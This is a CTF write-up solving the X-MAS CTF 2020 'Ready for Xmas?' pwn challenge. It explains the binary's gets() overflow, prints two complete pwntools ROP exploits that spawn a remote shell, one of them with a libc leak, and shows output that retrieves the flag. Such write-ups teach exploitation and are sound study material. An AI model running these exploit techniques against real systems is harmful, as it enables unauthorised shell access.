# X-MAS CTF 2020

## Ready for Xmas?

> ??
>
> Are you ready for aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/shawhkj\xffwaa ?
>
> Target: `nc challs.xmas.htsp.ro 2001`
> 
> Author: Th3R4nd0m>
> 
> [ready_for_xmas.zip](ready_for_xmas.zip)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _remote-shell_


## Summary

_There is no right or wrong, just fun and boring. -- The Plague_

There are two ways to solve this, the _fun_ way, and the _boring_ way.  I'll cover both starting with the _boring_ way.

The _boring_ path leverages gifts GOT `system` and no PIE string `sh`.

The _fun_ path makes you work for both.

> I actually did this the _fun_ way, because it seemed an obvious path, then CTF buddy xfactor lol'd me with the _boring_ way.  Sometimes we just need to slow down and fully enumerate.  In any case, no regrets.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Limited mitigations, basically anything goes but shellcode. 


### Decompile with Ghidra

```c
undefined8 main(void)
{
  char *pcVar1;
  char local_48 [64];
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  if (DAT_00601099 != '\0') {
    exit(0);
  }
  memset(s_cat_flag_00601068,0,9);
  puts("Hi. How are you doing today, good sir? Ready for Christmas?");
  gets(local_48);
  pcVar1 = strstr(local_48,"sh");
  if (pcVar1 == (char *)0x0) {
    pcVar1 = strstr(local_48,"cat");
    if (pcVar1 == (char *)0x0) {
      DAT_00601099 = 1;
      mprotect(&DAT_00601099,1,1);
      return 0;
    }
  }
  exit(0);
}
```

`gets` is our vulnerability (you _getting_ tired of these yet?), and the gateway to `return` for a ROP chain is _NOT_ having the strings `sh` or `cat` in our payload.  Now that is stupid simple to fix, just start payload with `\0`, then `strstr` will just stop trying to match anything beyond that.

The _boring_ way to solve this is to notice that `system` is in the GOT (double click on `.got.plt` in Ghidra) and to abuse that `strstr(local_48,"sh")` statement by using the `sh` string as input to `system`.  `system` unlike `execve` will actually search its `PATH` and find `sh` in `/bin` for you, so no need to provide string `/bin/sh`.  Prepend your payload with `0x48` bytes of garbage first since `local48` is `0x48` bytes from the return address.  Pretty _boring_, right?

Now for some _fun_...

Normally for these easy ROPs I just use `printf` or `puts` to leak libc, loop back to `main`, then use that to get a shell, however this challenge was specially designed to block that type of exploit.  The global `DAT_00601099` that is initialized to zero checks that it is still zero, otherwise it exits.  Just before the `return`, `DAT_00601099` is set to `1`, and then set to read only by `mprotect`.

So, for _fun_ we'll have to create a ROP chain to change `DAT_00601099` back to R/W, and then reset `DAT_00601099` back to zero before leaking libc with `puts` and looping back to main.

### Let's go shopping (for _fun_)

Clearly we'll use `mprotect` and `memset` for this, and each will require `rdi`, `rsi` and `rdx` be set before calling (the Linux ABI expects the first 3 args to be `rdi`, `rsi`, `rdx` in that order).

`pop rdi; ret` is in just about every x86_64 binary, so we can check that off.  To set `rsi` and `rdx` after visually searching with `ropper --file chall`, I settled on:

```
0x4008e1: pop rsi; pop r15; ret;
0x400786: mov rdx, r15; nop; pop rbp; ret;
```

There's no `pop rdx`, but the `pop r15` from the first gadget followed by the `mov rdx, r15` from the second will address that limitation.

Shopping over, let's have some _fun_.


## _Boring_ Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall')

if args.REMOTE:
	p = remote('challs.xmas.htsp.ro', 2001)
else:
	p = process(binary.path)

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = b''
payload += 0x48 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(binary.search(b'sh').__next__())
payload += p64(binary.plt.system)

p.sendlineafter('Christmas?\n', payload)
p.interactive()
```

Pretty basic, after writing out our garbage, follow that up with a `ret; pop_rdi` with the address of the `sh` string in the binary, and then the GOT call to `system`.

> The `pop_rdi+1` is `ret` and is needed to fix a stack alignment issue to prevent `system` from segfaulting.  Google for _movaps segfault ctf_ sometime if you want to know why this is needed.

> There was no need to start payload with `\0` since there's no string `cat` or `sh` in our payload.  This is a static payload that does not change, no PIE, so no worries.

Output:

```bash
# ./exploit_boring.py REMOTE=1
[*] '/pwd/datajerk/xmasctf2020/ready_for_xmas/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challs.xmas.htsp.ro on port 2001: Done
[*] Loaded 14 cached gadgets for './chall'
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat /home/ctf/flag.txt
X-MAS{l00ks_lik3_y0u_4re_r3ady}
```


## _Fun_ Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall')
binary.symbols['main'] = 0x40078c

if args.REMOTE:
    p = remote('challs.xmas.htsp.ro', 2001)
    libc = ELF('libc.so.6')
else:
    p = process(binary.path)
    libc = binary.libc

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = b'\0'
payload += (0x48 - len(payload)) * b'A'
```

This exploit starts out the same as the _boring_ version, however the payload does start with a NULL to bypass `strstr` checks.

```python
# 0x4008e1: pop rsi; pop r15; ret;
payload += p64(0x4008e1)
payload += p64(1)
payload += p64(0)
# 0x400786: mov rdx, r15; nop; pop rbp; ret;
payload += p64(0x400786)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(0x601099)
payload += p64(binary.plt.mprotect)
```

This part of the payload will call `mprotect` and set the global `DAT_00601099` back to R/W.  As mentioned in the analysis section, the `pop r15` + the `mov rdx, r15` is used to set `rdx`.  There's an extra `pop rdp` that we do not need or care about so it's set to the garbage value `0xdeadbeef`.

Since we're calling `mprotect` right after calling `mprotect` (see source, our ROP chain starts right after `mprotect`), then we get a lot for free and could use most of the registers as it, however this code is more reusable.

> At times you have no choice to live off the land, i.e. there's no ROP gadget to set the value that you need.

```python
# 0x4008e1: pop rsi; pop r15; ret;
payload += p64(0x4008e1)
payload += p64(0)
payload += p64(1)
# 0x400786: mov rdx, r15; nop; pop rbp; ret;
payload += p64(0x400786)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(0x601099)
payload += p64(binary.plt.memset)
```

Not dissimilar to `mprotect`, but this time a call to `memset` to reset global `DAT_00601099` back to zero.

```python
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.main)

p.sendlineafter('Christmas?\n', payload)

_ = p.recv(6)
puts = u64(_ + b'\0\0')
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = b'\0'
payload += (0x48 - len(payload)) * b'A'
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter('Christmas?\n', payload)
p.interactive()
```

Finally, standard fare CTF ROPing.  Just leak libc with `puts`, loop back to `main` for a second pass; since we reset global `DAT_00601099`, we'll pass the check allowing for a second pass.

Using the libc leak search libc for `/bin/sh` and use the libc `system` (the GOT `system` would have worked as well).

Output:

```bash
# ./exploit_fun.py REMOTE=1
[*] '/pwd/datajerk/xmasctf2020/ready_for_xmas/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challs.xmas.htsp.ro on port 2001: Done
[*] '/pwd/datajerk/xmasctf2020/ready_for_xmas/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './chall'
[*] libc.address: 0x7fb6b4795000
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat /home/ctf/flag.txt
X-MAS{l00ks_lik3_y0u_4re_r3ady}
```

